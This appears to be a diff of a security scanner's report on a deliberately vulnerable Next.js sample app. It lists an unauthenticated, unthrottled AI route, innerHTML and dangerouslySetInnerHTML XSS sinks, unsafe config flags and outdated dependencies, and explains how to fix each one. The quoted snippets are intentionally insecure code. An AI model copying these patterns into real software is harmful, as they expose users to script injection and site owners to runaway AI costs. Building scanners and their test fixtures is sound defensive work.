+│  This route handler calls a paid AI model (OpenAI / Anthropic / etc.) but                        │
+│  nothing in the file checks who is calling it — no session, no login, no API                     │
+│  token. That means ANYONE on the internet who finds the URL can hit it as                        │
+│  many times as they like. Every call costs you money, so a bot can run up a                      │
+│  huge bill on your account overnight ("denial of wallet"), and your model                        │
+│  quota gets drained for real users. It also lets strangers use your app as a                     │
+│  free LLM proxy. (This is a heuristic: if your auth check lives in middleware                    │
+│  or a shared helper this file doesn't reference, you can add a                                   │
+│  `// njordscan-ignore` comment on the call line.)                                                │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Before calling the model, confirm the request is from a logged-in user and                      │
+│  reject it otherwise. Use whatever auth you already have: `getServerSession`                     │
+│  (NextAuth), `auth()` (Clerk), `supabase.auth.getUser()`, or a check on the                      │
+│  `Authorization` header / API key for server-to-server calls. Return 401 if                      │
+│  the check fails — do this first, before any model call.                                         │
+│    import { getServerSession } from 'next-auth';                                                 │
+│    export async function POST(req) {                                                             │
+│      const session = await getServerSession();                                                   │
+│      if (!session) return new Response('Unauthorized', { status: 401 });                         │
+│      const completion = await openai.chat.completions.create({                                   │
+│        model: 'gpt-4o-mini', max_tokens: 500, messages,                                          │
+│      });                                                                                         │
+│      return Response.json(completion);                                                           │
+│    }                                                                                             │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://owasp.org/www-project-top-10-for-large-language-model-applications/                │
+│     • https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html              │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  12. 🟠 [HIGH] Dependency with a known security vulnerability ────────────────────────────────╮
-│                                                                                                │
-│  package.json:14                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  lodash@4.17.15 is affected by CVE-2026-4800 (vulnerable >=4.0.0,<4.18.0). Upgrade to 4.18.0   │
-│  or later. (EPSS 0% 30-day exploit probability) 🎯 `lodash` is imported and used in your       │
-│  code. lodash vulnerable to Code Injection via `_.template` imports key names                  │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "lodash": "4.17.15"  // CVE-2026-4800                                                       │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  7. 🟠 [HIGH] User input assigned to innerHTML / outerHTML ─────────────────────────────────────╮
+│                                                                                                  │
+│  app/api/chat/route.ts:14                                                                        │
+│  CWE-79  ·  A03:2021-Injection  ·  ATT&CK T1059.007  ·  confidence: medium                       │
+│                                                                                                  │
+│  🎯 Reachable (server-side) from app/api/chat/route.ts                                           │
+│                                                                                                  │
+│  innerHTML assigned a non-literal value; renders as HTML and can execute injected scripts if     │
+│  user-controlled.                                                                                │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    document.getElementById('a').innerHTML = answer; // LLM output rendered as HTML (XSS)         │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  Assigning a string to `element.innerHTML` parses it as HTML. When the string contains data an   │
+│  attacker controls, they can inject markup that runs JavaScript in your users' browsers          │
+│  (cross-site scripting), letting them hijack accounts or steal data.                             │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Use `element.textContent` to insert text safely, or build DOM nodes explicitly. In React,       │
+│  render `{value}` instead of touching innerHTML. If raw HTML is unavoidable, sanitize with       │
+│  DOMPurify first.                                                                                │
+│    element.textContent = userInput; // rendered as text, never executed                          │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://owasp.org/www-community/attacks/xss/                                               │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  13. 🟠 [HIGH] Untrusted data rendered with dangerouslySetInnerHTML ──────────────────────────╮
-│                                                                                                │
-│  components/ProductReview.tsx:3                                                                │
-│  CWE-79  ·  A03:2021-Injection  ·  ATT&CK T1059.007  ·  confidence: medium                     │
-│                                                                                                │
-│  ○ Not reachable from a known entrypoint (lower priority)                                      │
-│                                                                                                │
-│  dangerouslySetInnerHTML receives a non-literal value; if any part is user-controlled this is  │
-│  an XSS sink.                                                                                  │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    return <div dangerouslySetInnerHTML={{ __html: review.body }} />;                           │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  React normally escapes everything you render, which protects your users automatically.        │
-│  `dangerouslySetInnerHTML` turns that protection OFF and injects raw HTML. If any part of      │
-│  that HTML comes from a user (a form field, a URL, an API response, the database), an          │
-│  attacker can smuggle in a <script> tag and run their own JavaScript in your users' browsers   │
-│  — stealing logins, cookies, or making requests as the victim. This is called cross-site       │
-│  scripting (XSS).                                                                              │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Prefer rendering text as `{value}` and let React escape it. If you truly need to render HTML  │
-│  (e.g. rich text from a CMS), sanitize it first with a library like DOMPurify and only then    │
-│  pass the cleaned string to dangerouslySetInnerHTML.                                           │
-│    import DOMPurify from 'isomorphic-dompurify';                                               │
-│    const clean = DOMPurify.sanitize(userHtml);                                                 │
-│    return <div dangerouslySetInnerHTML={{ __html: clean }} />;                                 │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     •                                                                                          │
-│  https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html    │
-│     • https://owasp.org/www-community/attacks/xss/                                             │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  8. 🟠 [HIGH] User input assigned to innerHTML / outerHTML ─────────────────────────────────────╮
+│                                                                                                  │
+│  app/api/products/route.ts:10                                                                    │
+│  CWE-79  ·  A03:2021-Injection  ·  ATT&CK T1059.007  ·  confidence: high                         │
+│                                                                                                  │
+│  🎯 Reachable (server-side) from app/api/products/route.ts                                       │
+│                                                                                                  │
+│  User input from `req.body` flows into paint() -> el.innerHTML [in lib/render.ts].               │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    paint(el, body.labelHtml);                                                                    │
+│                                                                                                  │
+│  Data flow (untrusted input → dangerous use):                                                    │
+│          source: req.body (app/api/products/route.ts:5)                                          │
+│     ↓                                                                                            │
+│     propagation: paint() in lib/render.ts (param 1 -> el.innerHTML) (lib/render.ts:10)           │
+│     ↓                                                                                            │
+│            sink: paint() -> el.innerHTML [in lib/render.ts] (app/api/products/route.ts:10)       │
+│                                                                                                  │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  Assigning a string to `element.innerHTML` parses it as HTML. When the string contains data an   │
+│  attacker controls, they can inject markup that runs JavaScript in your users' browsers          │
+│  (cross-site scripting), letting them hijack accounts or steal data.                             │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Use `element.textContent` to insert text safely, or build DOM nodes explicitly. In React,       │
+│  render `{value}` instead of touching innerHTML. If raw HTML is unavoidable, sanitize with       │
+│  DOMPurify first.                                                                                │
+│    element.textContent = userInput; // rendered as text, never executed                          │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://owasp.org/www-community/attacks/xss/                                               │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  14. 🟡 [MEDIUM] AI route calls the model with no rate limit in the file ─────────────────────╮
-│                                                                                                │
-│  app/api/chat/route.ts:1                                                                       │
-│  CWE-770  ·  A04:2021-Insecure Design  ·  ATT&CK T1190, T1496  ·  confidence: low              │
-│                                                                                                │
-│  🎯 Reachable (server-side) from app/api/chat/route.ts                                         │
-│                                                                                                │
-│  This AI route calls the model with no rate limit in the file — one bot can call it thousands  │
-│  of times and drain your AI budget. Add a per-user/IP limit (e.g. Upstash Ratelimit) before    │
-│  the model call.                                                                               │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    import OpenAI from 'openai';                                                                │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This route calls a paid AI model but nothing in the file limits how often a                   │
-│  single user (or a bot) can call it. AI calls cost real money per request, so                  │
-│  without a cap one abusive client can hammer the endpoint thousands of times                   │
-│  and run up your bill or exhaust your model quota for everyone else ("denial                   │
-│  of wallet"). Even a friendly bug — a retry loop in the UI — can do this by                    │
-│  accident. (Heuristic: if you rate-limit in middleware or a shared helper                      │
-│  this file doesn't reference, add `// njordscan-ignore` on the call line.)                     │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Add a per-user / per-IP rate limit before the model call. A common setup is                   │
-│  Upstash Ratelimit on Vercel, but any limiter works. Reject requests that go                   │
-│  over the limit with HTTP 429 before spending money on a model call.                           │
-│    import { Ratelimit } from '@upstash/ratelimit';                                             │
-│    import { Redis } from '@upstash/redis';                                                     │
-│    const ratelimit = new Ratelimit({ redis: Redis.fromEnv(), limiter:                          │
-│    Ratelimit.slidingWindow(10, '60 s') });                                                     │
-│    export async function POST(req) {                                                           │
-│      const { success } = await ratelimit.limit(req.ip ?? 'anon');                              │
-│      if (!success) return new Response('Too Many Requests', { status: 429 });                  │
-│      // ...call the model...                                                                   │
-│    }                                                                                           │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://owasp.org/www-project-top-10-for-large-language-model-applications/              │
-│     • https://upstash.com/docs/redis/sdks/ratelimit-ts/overview                                │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  9. 🟠 [HIGH] User input assigned to innerHTML / outerHTML ─────────────────────────────────────╮
+│                                                                                                  │
+│  lib/render.ts:3                                                                                 │
+│  CWE-79  ·  A03:2021-Injection  ·  ATT&CK T1059.007  ·  confidence: medium                       │
+│                                                                                                  │
+│  🎯 Reachable (server-side) from app/api/products/route.ts                                       │
+│                                                                                                  │
+│  innerHTML assigned a non-literal value; renders as HTML and can execute injected scripts if     │
+│  user-controlled.                                                                                │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    el.innerHTML = html;                                                                          │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  Assigning a string to `element.innerHTML` parses it as HTML. When the string contains data an   │
+│  attacker controls, they can inject markup that runs JavaScript in your users' browsers          │
+│  (cross-site scripting), letting them hijack accounts or steal data.                             │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Use `element.textContent` to insert text safely, or build DOM nodes explicitly. In React,       │
+│  render `{value}` instead of touching innerHTML. If raw HTML is unavoidable, sanitize with       │
+│  DOMPurify first.                                                                                │
+│    element.textContent = userInput; // rendered as text, never executed                          │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://owasp.org/www-community/attacks/xss/                                               │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  15. 🟡 [MEDIUM] Dependency with a known security vulnerability ──────────────────────────────╮
-│                                                                                                │
-│  package.json:11                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  next@12.1.0 is affected by CVE-2025-57822 (vulnerable >=0.9.9,<14.2.32). Upgrade to 14.2.32   │
-│  or later. (EPSS 8% 30-day exploit probability) 🎯 `next` is imported and used in your code.   │
-│  Next.js Improper Middleware Redirect Handling Leads to SSRF                                   │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "next": "12.1.0"  // CVE-2025-57822                                                         │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  10. 🟠 [HIGH] Dependency with a known security vulnerability ──────────────────────────────────╮
+│                                                                                                  │
+│  package.json:14                                                                                 │
+│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·  confidence:   │
+│  high                                                                                            │
+│                                                                                                  │
+│  🎯 Reachable                                                                                    │
+│                                                                                                  │
+│  lodash@4.17.15 is affected by CVE-2021-23337 (vulnerable <4.17.21). Upgrade to 4.17.21 or       │
+│  later. 🎯 Reachable: your code calls the vulnerable `template` from `lodash`. Command           │
+│  injection in lodash via the template function: untrusted templates/options can execute          │
+│  arbitrary code.                                                                                 │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    "lodash": "4.17.15"  // CVE-2021-23337                                                        │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers        │
+│  actively scan for apps using vulnerable versions because a working exploit is already           │
+│  published.                                                                                      │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in         │
+│  package.json).                                                                                  │
+│    npm install <package>@<patched-version>                                                       │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://github.com/advisories                                                              │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  16. 🟡 [MEDIUM] Dependency with a known security vulnerability ──────────────────────────────╮
-│                                                                                                │
-│  package.json:11                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  next@12.1.0 is affected by CVE-2025-59471 (vulnerable >=10.0.0,<15.5.10). Upgrade to 15.5.10  │
-│  or later. (EPSS 0% 30-day exploit probability) 🎯 `next` is imported and used in your code.   │
-│  Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns         │
-│  configuration                                                                                 │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "next": "12.1.0"  // CVE-2025-59471                                                         │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  11. 🟠 [HIGH] Untrusted data rendered with dangerouslySetInnerHTML ────────────────────────────╮
+│                                                                                                  │
+│  components/ProductReview.tsx:3                                                                  │
+│  CWE-79  ·  A03:2021-Injection  ·  ATT&CK T1059.007  ·  confidence: medium                       │
+│                                                                                                  │
+│  ○ Not reachable from a known entrypoint (lower priority)                                        │
+│                                                                                                  │
+│  dangerouslySetInnerHTML receives a non-literal value; if any part is user-controlled this is    │
+│  an XSS sink.                                                                                    │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    return <div dangerouslySetInnerHTML={{ __html: review.body }} />;                             │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  React normally escapes everything you render, which protects your users automatically.          │
+│  `dangerouslySetInnerHTML` turns that protection OFF and injects raw HTML. If any part of that   │
+│  HTML comes from a user (a form field, a URL, an API response, the database), an attacker can    │
+│  smuggle in a <script> tag and run their own JavaScript in your users' browsers — stealing       │
+│  logins, cookies, or making requests as the victim. This is called cross-site scripting (XSS).   │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Prefer rendering text as `{value}` and let React escape it. If you truly need to render HTML    │
+│  (e.g. rich text from a CMS), sanitize it first with a library like DOMPurify and only then      │
+│  pass the cleaned string to dangerouslySetInnerHTML.                                             │
+│    import DOMPurify from 'isomorphic-dompurify';                                                 │
+│    const clean = DOMPurify.sanitize(userHtml);                                                   │
+│    return <div dangerouslySetInnerHTML={{ __html: clean }} />;                                   │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     •                                                                                            │
+│  https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html      │
+│     • https://owasp.org/www-community/attacks/xss/                                               │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  17. 🟡 [MEDIUM] Dependency with a known security vulnerability ──────────────────────────────╮
-│                                                                                                │
-│  package.json:11                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  next@12.1.0 is affected by CVE-2025-57752 (vulnerable >=0.9.9,<14.2.31). Upgrade to 14.2.31   │
-│  or later. (EPSS 0% 30-day exploit probability) 🎯 `next` is imported and used in your code.   │
-│  Next.js Affected by Cache Key Confusion for Image Optimization API Routes                     │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "next": "12.1.0"  // CVE-2025-57752                                                         │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  12. 🟡 [MEDIUM] AI route calls the model with no rate limit in the file ───────────────────────╮
+│                                                                                                  │
+│  app/api/chat/route.ts:1                                                                         │
+│  CWE-770  ·  A04:2021-Insecure Design  ·  ATT&CK T1190, T1496  ·  confidence: low                │
+│                                                                                                  │
+│  🎯 Reachable (server-side) from app/api/chat/route.ts                                           │
+│                                                                                                  │
+│  This AI route calls the model with no rate limit in the file — one bot can call it thousands    │
+│  of times and drain your AI budget. Add a per-user/IP limit (e.g. Upstash Ratelimit) before the  │
+│  model call.                                                                                     │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    import OpenAI from 'openai';                                                                  │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  This route calls a paid AI model but nothing in the file limits how often a                     │
+│  single user (or a bot) can call it. AI calls cost real money per request, so                    │
+│  without a cap one abusive client can hammer the endpoint thousands of times                     │
+│  and run up your bill or exhaust your model quota for everyone else ("denial                     │
+│  of wallet"). Even a friendly bug — a retry loop in the UI — can do this by                      │
+│  accident. (Heuristic: if you rate-limit in middleware or a shared helper                        │
+│  this file doesn't reference, add `// njordscan-ignore` on the call line.)                       │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Add a per-user / per-IP rate limit before the model call. A common setup is                     │
+│  Upstash Ratelimit on Vercel, but any limiter works. Reject requests that go                     │
+│  over the limit with HTTP 429 before spending money on a model call.                             │
+│    import { Ratelimit } from '@upstash/ratelimit';                                               │
+│    import { Redis } from '@upstash/redis';                                                       │
+│    const ratelimit = new Ratelimit({ redis: Redis.fromEnv(), limiter:                            │
+│    Ratelimit.slidingWindow(10, '60 s') });                                                       │
+│    export async function POST(req) {                                                             │
+│      const { success } = await ratelimit.limit(req.ip ?? 'anon');                                │
+│      if (!success) return new Response('Too Many Requests', { status: 429 });                    │
+│      // ...call the model...                                                                     │
+│    }                                                                                             │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://owasp.org/www-project-top-10-for-large-language-model-applications/                │
+│     • https://upstash.com/docs/redis/sdks/ratelimit-ts/overview                                  │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  18. 🟡 [MEDIUM] Dependency with a known security vulnerability ──────────────────────────────╮
-│                                                                                                │
-│  package.json:11                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  next@12.1.0 is affected by CVE-2024-47831 (vulnerable >=10.0.0,<14.2.7). Upgrade to 14.2.7    │
-│  or later. (EPSS 1% 30-day exploit probability) 🎯 `next` is imported and used in your code.   │
-│  Denial of Service condition in Next.js image optimization                                     │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "next": "12.1.0"  // CVE-2024-47831                                                         │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  13. 🟡 [MEDIUM] Missing security response headers ─────────────────────────────────────────────╮
+│                                                                                                  │
+│  next.config.js:1                                                                                │
+│  CWE-693  ·  A05:2021-Security Misconfiguration  ·  ATT&CK T1190, T1185  ·  confidence: low      │
+│                                                                                                  │
+│  ○ Not reachable from a known entrypoint (lower priority)                                        │
+│                                                                                                  │
+│  next.config defines no security headers (no `headers()` setting X-Frame-Options /               │
+│  Content-Security-Policy / Strict-Transport-Security). Add them for defense in depth, unless     │
+│  you set them in middleware.                                                                     │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  Security headers (Content-Security-Policy, X-Frame-Options, Strict-Transport-Security,          │
+│  X-Content-Type-Options) are extra guardrails the browser enforces for you — blocking            │
+│  clickjacking, forcing HTTPS, and limiting the damage of an XSS bug. Without them you lose       │
+│  defense in depth.                                                                               │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Set security headers in next.config.js `headers()` (or your server/middleware).                 │
+│    // next.config.js                                                                             │
+│    async headers() {                                                                             │
+│      return [{ source: '/(.*)', headers: [                                                       │
+│        { key: 'X-Frame-Options', value: 'DENY' },                                                │
+│        { key: 'X-Content-Type-Options', value: 'nosniff' },                                      │
+│        { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains;          │
+│    preload' },                                                                                   │
+│      ]}];                                                                                        │
+│    }                                                                                             │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://nextjs.org/docs/app/api-reference/next-config-js/headers                           │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  19. 🟡 [MEDIUM] Dependency with a known security vulnerability ──────────────────────────────╮
-│                                                                                                │
-│  package.json:11                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  next@12.1.0 is affected by CVE-2026-44577 (vulnerable >=10.0.0,<15.5.16). Upgrade to 15.5.16  │
-│  or later. (EPSS 0% 30-day exploit probability) 🎯 `next` is imported and used in your code.   │
-│  Next.js has a Denial of Service in the Image Optimization API                                 │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "next": "12.1.0"  // CVE-2026-44577                                                         │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  14. 🟡 [MEDIUM] Insecure Next.js configuration ────────────────────────────────────────────────╮
+│                                                                                                  │
+│  next.config.js:2                                                                                │
+│  CWE-16  ·  A05:2021-Security Misconfiguration  ·  ATT&CK T1190  ·  confidence: high             │
+│                                                                                                  │
+│  ○ Not reachable from a known entrypoint (lower priority)                                        │
+│                                                                                                  │
+│  `typescript.ignoreBuildErrors: true` disables a safety check, letting type/lint errors ship to  │
+│  production.                                                                                     │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    typescript: { ignoreBuildErrors: true },   // ships type errors to prod                       │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  Some next.config options loosen safety in ways that are easy to ship by accident — e.g.         │
+│  ignoring build/type errors hides real bugs, and overly broad image `domains`/`remotePatterns`   │
+│  let attackers proxy arbitrary content through your domain.                                      │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Don't ignore type/lint errors in production builds, and scope image and rewrite patterns to     │
+│  hosts you control.                                                                              │
+│    images: { remotePatterns: [{ protocol: 'https', hostname: 'assets.example.com' }] }           │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://nextjs.org/docs/app/api-reference/next-config-js                                   │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  20. 🟡 [MEDIUM] Dependency with a known security vulnerability ──────────────────────────────╮
-│                                                                                                │
-│  package.json:11                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  next@12.1.0 is affected by CVE-2025-55173 (vulnerable >=0.9.9,<14.2.31). Upgrade to 14.2.31   │
-│  or later. (EPSS 1% 30-day exploit probability) 🎯 `next` is imported and used in your code.   │
-│  Next.js Content Injection Vulnerability for Image Optimization                                │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "next": "12.1.0"  // CVE-2025-55173                                                         │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  15. 🟡 [MEDIUM] Insecure Next.js configuration ────────────────────────────────────────────────╮
+│                                                                                                  │
+│  next.config.js:3                                                                                │
+│  CWE-16  ·  A05:2021-Security Misconfiguration  ·  ATT&CK T1190  ·  confidence: high             │
+│                                                                                                  │
+│  ○ Not reachable from a known entrypoint (lower priority)                                        │
+│                                                                                                  │
+│  `eslint.ignoreDuringBuilds: true` disables a safety check, letting type/lint errors ship to     │
+│  production.                                                                                     │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    eslint: { ignoreDuringBuilds: true },                                                         │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  Some next.config options loosen safety in ways that are easy to ship by accident — e.g.         │
+│  ignoring build/type errors hides real bugs, and overly broad image `domains`/`remotePatterns`   │
+│  let attackers proxy arbitrary content through your domain.                                      │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Don't ignore type/lint errors in production builds, and scope image and rewrite patterns to     │
+│  hosts you control.                                                                              │
+│    images: { remotePatterns: [{ protocol: 'https', hostname: 'assets.example.com' }] }           │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://nextjs.org/docs/app/api-reference/next-config-js                                   │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  21. 🟡 [MEDIUM] Dependency with a known security vulnerability ──────────────────────────────╮
-│                                                                                                │
-│  package.json:14                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  lodash@4.17.15 is affected by CVE-2020-28500 (vulnerable >=4.0.0,<4.17.21). Upgrade to        │
-│  4.17.21 or later. (EPSS 0% 30-day exploit probability) 🎯 `lodash` is imported and used in    │
-│  your code. Regular Expression Denial of Service (ReDoS) in lodash                             │
-│                                                                                                │
